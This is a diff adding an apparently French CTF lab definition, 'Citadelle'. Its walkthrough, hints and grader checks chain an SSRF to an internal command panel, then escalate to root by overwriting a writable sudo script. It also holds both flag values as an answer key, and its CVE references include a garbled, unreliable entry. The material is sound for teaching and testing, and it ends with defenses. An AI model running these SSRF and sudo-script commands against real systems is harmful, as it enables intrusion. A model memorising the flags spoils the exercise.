@@ -1,0 +1,107 @@
+title: Citadelle
+track: offensif
+machine_os: linux
+level: expert
+order: 5
+tags: [machine, web, ssrf, service interne, rce, élévation de privilèges, sudo, script modifiable, linux, cve]
+summary: Machine Insane Linux - un récupérateur d'URL côté serveur (SSRF) donne accès à un panneau d'administration interne qui exécute des commandes (RCE), puis un script lancé en sudo mais modifiable mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{c1t4d3ll3_ssrf_s3rv1c3_1nt3rn3}"
+  root: "TDM{c1t4d3ll3_scr1pt_sud0_mod1f1abl3}"
+description: |
+  **Machine : Citadelle · Insane · 🐧 Linux**
+
+  La cible n'expose qu'un **portail public** (port 80) avec un « récupérateur de ressources ». Mais elle
+  fait aussi tourner un **service d'administration interne** que tu ne peux pas joindre directement. Comme
+  sur une machine Hack The Box difficile, tu dois enchaîner plusieurs maillons : faire parler le serveur à
+  sa propre boucle locale, atteindre le service caché, obtenir du code, puis élever tes privilèges.
+  Objectif : drapeau **utilisateur** (`user.txt`) puis drapeau **root** (`root.txt`).
+
+  Tout est isolé dans le réseau du lab (`internal`). **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - le portail récupère une **URL** côté serveur (`/recuperer`).
+  2. Et s'il récupérait une URL **interne** ? Fais-lui demander `http://127.0.0.1:8080/` : c'est une
+     **SSRF**. Tu découvres un panneau d'admin réservé à la boucle locale.
+  3. Ce panneau expose `/run?cmd=...`. Via la SSRF, exécute des commandes : tu agis en tant que `svc`.
+     Lis `user.txt`.
+  4. `sudo -l` montre un script lançable en root. Vérifie ses **permissions** : s'il est modifiable par
+     `svc`, réécris-le pour lire `root.txt`, puis lance-le en sudo.
+
+  Outils : `curl`, `nmap`, `python3`.
+cours: |
+  ## SSRF, service interne et élévation par script sudo modifiable
+
+  ### SSRF (Server-Side Request Forgery)
+
+  Quand une application va **chercher une URL fournie par l'utilisateur** sans la restreindre, l'attaquant
+  la force à émettre des requêtes depuis le serveur : vers la **boucle locale** (`127.0.0.1`), le réseau
+  interne, ou des métadonnées cloud. On atteint ainsi des services qui se croyaient protégés parce que
+  « non exposés ». C'est une faille majeure (OWASP Top 10 A10). CVE marquantes :
+
+  - **CVE-2019-? / Capital One** : une SSRF a servi à lire les métadonnées AWS et exfiltrer des données.
+  - **CVE-2021-22214** (GitLab) et **CVE-2022-1040** : SSRF menant à l'accès de services internes / RCE.
+
+  Ici, `/recuperer?url=` télécharge l'URL côté serveur. On vise le service interne :
+
+  ```
+  curl -s -G http://cible/recuperer --data-urlencode 'url=http://127.0.0.1:8080/'
+  curl -s -G http://cible/recuperer --data-urlencode 'url=http://127.0.0.1:8080/run?cmd=id'
+  curl -s -G http://cible/recuperer --data-urlencode 'url=http://127.0.0.1:8080/run?cmd=cat /home/svc/user.txt'
+  ```
+
+  Le panneau interne « de confiance » exécute la commande : tu obtiens une **RCE** en tant que `svc`.
+
+  ### Élévation : script sudo modifiable
+
+  `sudo -l` révèle `(root) NOPASSWD: /usr/local/bin/sauvegarde.sh`. Erreur classique : le script est
+  **modifiable** par `svc` (`ls -l`). Tu contrôles donc ce qui s'exécute en root :
+
+  ```
+  # (via la RCE SSRF, en tant que svc)
+  echo 'cat /root/root.txt' > /usr/local/bin/sauvegarde.sh
+  sudo /usr/local/bin/sauvegarde.sh
+  ```
+
+  ### Côté défense
+
+  Pour la SSRF : liste blanche d'URL/hôtes, interdire les adresses internes/loopback, pas de suivi de
+  redirections aveugle. Pour sudo : un binaire/script lançable en root ne doit **jamais** être modifiable
+  par l'utilisateur qui l'exécute (propriétaire root, `chmod 755`), et éviter autant que possible les
+  règles `NOPASSWD`.
+docs:
+  - title: OWASP - Server-Side Request Forgery (SSRF)
+    url: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+  - title: PayloadsAllTheThings - SSRF
+    url: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+exercises:
+  - id: reconnaissance
+    title: Repérer le récupérateur
+    description: |
+      Récupère la page d'accueil du portail et repère l'endpoint `/recuperer`. Enregistre la page dans
+      `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      Comprendre que le serveur télécharge lui-même une URL est la clé : c'est ce comportement qui va te
+      permettre d'atteindre des services qui ne sont pas exposés sur le réseau.
+    checks:
+      - desc: La page du portail a été récupérée
+        run: grep -qi 'Citadelle' /root/reponses/accueil.html
+  - id: ssrf
+    title: SSRF vers le service interne et RCE
+    description: |
+      Sers-toi de `/recuperer` pour atteindre le panneau interne `http://127.0.0.1:8080/` puis exécute
+      `id` **sur la cible** via `/run?cmd=`. Enregistre la sortie (`uid=...(svc)`) dans
+      `/root/reponses/ssrf.txt`.
+    hint: "curl -s -G http://cible/recuperer --data-urlencode 'url=http://127.0.0.1:8080/run?cmd=id' | tee /root/reponses/ssrf.txt"
+    cours: |
+      Atteindre `127.0.0.1:8080` depuis l'extérieur prouve la SSRF ; la sortie de `id` prouve la RCE et
+      t'indique l'utilisateur de service (`svc`). De là tu lis `user.txt` puis tu cherches l'élévation de
+      privilèges avec `sudo -l` et un examen des permissions.
+    checks:
+      - desc: La SSRF atteint le service interne et exécute du code en tant que svc
+        run: grep -q 'uid=' /root/reponses/ssrf.txt && grep -q 'svc' /root/reponses/ssrf.txt
